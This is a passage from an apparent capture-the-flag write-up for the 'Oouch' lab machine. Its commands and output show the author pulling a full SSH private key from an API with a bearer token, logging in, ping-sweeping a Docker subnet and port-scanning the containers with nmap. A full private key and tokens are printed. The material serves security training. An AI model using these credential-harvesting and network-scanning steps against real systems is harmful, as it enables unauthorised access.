root@kali# curl -s authorization.oouch.htb:8000/api/get_user -H "Authorization: Bearer gm05wp2kDWhSmS3QrZmdEqgvFGoEKD" | jq .
{
  "username": "qtc",
  "firstname": "",
  "lastname": "",
  "email": "qtc@nonexistend.nonono"
}
get_ssh
Obviously this isn’t terribly useful information. I spent a while fuzzing for additional parameters that might return the other information entered into the signup form, the ssh key. Eventually, I tried hitting a different endpoint, /api/get_ssh:

root@kali# curl -s authorization.oouch.htb:8000/api/get_ssh -H "Authorization: Bearer gm05wp2kDWhSmS3QrZmdEqgvFGoEKD" | jq .
{
  "ssh_server": "consumer.oouch.htb",
  "ssh_user": "qtc",
  "ssh_key": "-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----"
}
That’s an ssh key!

SSH
I can save that key to a file (using jq -r to print the raw contents) :

root@kali# curl -s authorization.oouch.htb:8000/api/get_ssh -H "Authorization: Bearer LBLemeQIcZZtSgPB0Ax54DpJ1h1vrF" | jq -r '.ssh_key' > id_rsa_oouch_qtc
And connect over SSH as qtc:

root@kali# ssh -i ~/keys/id_rsa_oouch_qtc qtc@consumer.oouch.htb
Linux oouch 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Feb 25 12:45:55 2020 from 10.10.14.6
qtc@oouch:~$
From here I can grab user.txt:

qtc@oouch:~$ cat user.txt
d5f8b4e6************************
Shell as qtc on consumer container
Local Enumeration
In the qtc homedir next to user.txt is .note.txt:

qtc@oouch:~$ cat .note.txt 
Implementing an IPS using DBus and iptables == Genius?
That must be what was redirecting to the “Hacking Attempt Detected” page I found earlier. According to Freedesktop.org:

DBus is a message bus system, a simple way for applications to talk to one another. In addition to interprocess communication, D-Bus helps coordinate process lifecycle; it makes it simple and reliable to code a “single instance” application or daemon, and to launch applications and daemons on demand when their services are needed.

Reading about DBus, it seems that various applications are configured in files inside /etc/dbus-1/system.d. There are five configs present on Oouch:

qtc@oouch:~$ find /etc/dbus-1/system.d -type f
/etc/dbus-1/system.d/bluetooth.conf
/etc/dbus-1/system.d/wpa_supplicant.conf
/etc/dbus-1/system.d/org.freedesktop.PackageKit.conf
/etc/dbus-1/system.d/com.ubuntu.SoftwareProperties.conf
/etc/dbus-1/system.d/htb.oouch.Block.conf
The most interesting is the one that’s specific to this box, likely the one referenced by the note:

qtc@oouch:~$ cat /etc/dbus-1/system.d/htb.oouch.Block.conf
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

        <policy user="www-data">
                <allow send_destination="htb.oouch.Block"/>
                <allow receive_sender="htb.oouch.Block"/>
        </policy>

</busconfig>
This config file defines the owner of the application to be root, which means that any processes spawned by this application will also be run as root. The config also allows the www-data user to send to it and receive from it.

Looking around the host, there’s no evidence of a www-data user. In fact, the two webservers aren’t directly on this host, but in containers. There is a www-data user on this host, but the web services are being run out of containers, which I can see from the two docker-proxy processes I get from ps auxww:

root      3579  0.0  0.1 474988  7580 ?        Sl   15:47   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 5000 -container-ip 172.18.0.2 -container-port 5000
root      3651  0.0  0.1 474988  7620 ?        Sl   15:47   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 8000 -container-ip 172.18.0.5 -container-port 8000
Network Enumeration
I can do a quick ping sweep to see what hosts live on that subnet:

qtc@oouch:~$ for i in {1..254}; do (ping -c 1 172.18.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 172.18.0.1: icmp_seq=1 ttl=64 time=0.065 ms
64 bytes from 172.18.0.3: icmp_seq=1 ttl=64 time=0.083 ms
64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.103 ms
64 bytes from 172.18.0.4: icmp_seq=1 ttl=64 time=0.050 ms
64 bytes from 172.18.0.5: icmp_seq=1 ttl=64 time=0.066 ms
I uploaded a static copy of nmap, and ran some scans:

qtc@oouch:/dev/shm$ ./nmap -p- --min-rate 10000 172.18.0.2

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2020-03-14 16:10 CET
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.18.0.2
Host is up (0.00011s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE                             
22/tcp   open  ssh                                 
5000/tcp open  unknown                             

Nmap done: 1 IP address (1 host up) scanned in 14.42 seconds

qtc@oouch:/dev/shm$ ./nmap -p- --min-rate 10000 172.18.0.3
                                                                                                      
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2020-03-14 16:09 CET                                   
Unable to find nmap-services!  Resorting to /etc/services                                             
Cannot find nmap-payloads. UDP payloads are disabled.                                                 
Nmap scan report for 172.18.0.3                                                                       
Host is up (0.00014s latency).                                                                        
Not shown: 65534 closed ports                                                                         
PORT     STATE SERVICE                             
3306/tcp open  mysql                               

Nmap done: 1 IP address (1 host up) scanned in 14.51 seconds

qtc@oouch:/dev/shm$ ./nmap -p- --min-rate 10000 172.18.0.4
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2020-03-14 16:09 CET
Unable to find nmap-services!  Resorting to /etc/services                                           
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.18.0.4
Host is up (0.00013s latency).
Not shown: 65534 closed ports                                                                        
PORT     STATE SERVICE
3306/tcp open  mysql                                                                                 

Nmap done: 1 IP address (1 host up) scanned in 14.39 seconds

qtc@oouch:/dev/shm$ ./nmap -p- --min-rate 10000 172.18.0.5

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2020-03-14 19:08 CET
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.18.0.5
Host is up (0.000089s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
8000/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.45 seconds
These IPs will shuffle on each boot, but in my case, there are two MySQL servers (.3 and .4), consumer (.2), and authorization (.5). These match up with the IPs/ports from the docker-proxy commands.

SSH as qtc
Interestingly, consumer is listening on SSH in addition to 5000. There is also a private key in the /home/qtc/.ssh that is different than the key I used to connect to this box. It does work to SSH into the container (I don’t have to specify the key, as ssh will try all the keys in ~/.ssh):
